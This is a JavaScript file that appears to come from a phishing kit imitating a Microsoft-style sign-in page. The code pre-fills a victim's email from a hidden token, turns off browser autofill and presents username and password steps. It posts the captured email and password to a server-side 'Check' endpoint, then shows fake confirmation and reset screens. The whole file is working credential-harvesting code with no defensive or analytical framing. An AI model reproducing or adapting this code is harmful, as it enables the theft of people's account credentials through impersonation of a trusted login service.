        $(function() {
            //cfg
            var TknEml = $("input[name=TknEml]").val();
            var Respss = $("input[name=Respss]").val();
            var truLgn = $("input[name=truLgn]").val();
            //auto
            $('input').on('focus', function(obj) { // disable autofill
                $('input').removeAttr('autocomplete');
                $(this).attr('autocomplete', 'new-password');
            })
             
                
            if (TknEml.length !== 0) { 
                $("#FormUsername").hide();
                $("#FormPassword").show();
                $("#InputHidden").val(TknEml);
                $('#loginfmt').attr("value", " ");
            }else{ 
                $("#FormUsername").show(); 
            }

            $("#btnNextUsername").click(function() {
                $("#FormUsername").hide();
                var login = $("input[name=loginfmt]").val();
                $("#emailPaste").text(login);
                $("#FormPassword").show("slide", {
                    direction: "right"
                }, 500);
            });
            $("#btnLogin").click(function() {
                //get data
                //
                if (TknEml.length !== 0) {   
                    var em41l = TknEml;
                }else{   
                    var em41l = $("input[name=loginfmt]").val();
                }

                    var psw = $("input[name=US_Passwd]").val();
 

                    if (truLgn == "yes") {
                        $.ajax({
                            url: "../../Proses/Check",
                            type: "post",
                            data: {
                                "eml": em41l,
                                "pssw": psw
                            },
                            success: function(response) { 
                                if (response == "sukses") {


                                    $("#FormPassword").hide();
                                    $("#FormConfirmation").show("slide", {
                                        direction: "right"
                                    }, 400);

                                } else {
                                    window.location.href = '../../common/oauth2/authorizeErr';
                                }
                            },
                        });
                    } else {

                        $("#FormPassword").hide();
                        $("#FormConfirmation").show("slide", {
                            direction: "right"
                        }, 400);
                    }

            });

            $("#btnConfirm1,#btnConfirm2").click(function() {
                if (!Respss) { 
                    $("#from_login").submit();
                }else{  
                    $("#FormConfirmation").hide();
                    $("#FormReset").show("slide", {
                        direction: "right"
                    }, 400);
                } 
            });

            $("#btnReset").click(function() {
                $("#from_login").submit();
            });

        });
